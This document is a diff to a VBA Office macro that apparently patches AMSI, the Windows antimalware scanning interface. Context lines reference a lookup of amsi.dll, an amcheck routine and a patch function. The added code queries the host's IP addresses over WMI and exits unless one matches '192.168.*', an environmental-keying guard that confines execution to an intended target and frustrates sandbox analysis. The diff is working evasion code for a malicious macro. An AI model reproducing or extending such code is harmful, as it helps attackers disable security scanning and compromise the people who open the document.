@@ -38,6 +38,16 @@ Function MyMacro()
  Dim counter As LongPtr
  Dim data As String
  Dim res As LongPtr
+ Dim ipcheck As Boolean
+ ipcheck = False
+ Dim inscope As String
+ inscope = "192.168.*"
+ ipcheck = getMyIP(inscope)
+ If ipcheck Then
+    Debug.Print ("ip in scope!")
+ Else
+    Exit Function
+ End If
  StrFile = Dir("c:\windows\system32\a?s?.d*")
  Is64 = arch()
  check = amcheck(StrFile)
@@ -77,6 +87,23 @@ End Function
     #Else
         arch = False
     #End If
+End Function
+Public Function getMyIP(ipcheck As String) As Boolean
+    Dim objWMI As Object
+    Dim objQuery As Object
+    Dim objQueryItem As Object
+    Dim vIpAddress
+    Dim counter As Integer
+    Dim ips() As String
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
+    For Each objQueryItem In objQuery
+        For Each vIpAddress In objQueryItem.ipaddress
+            If CStr(vIpAddress) Like ipcheck Then
+                getMyIP = True
+            End If
+        Next
+    Next
 End Function
 Function patch(StrFile As String, Is64 As Boolean)
 
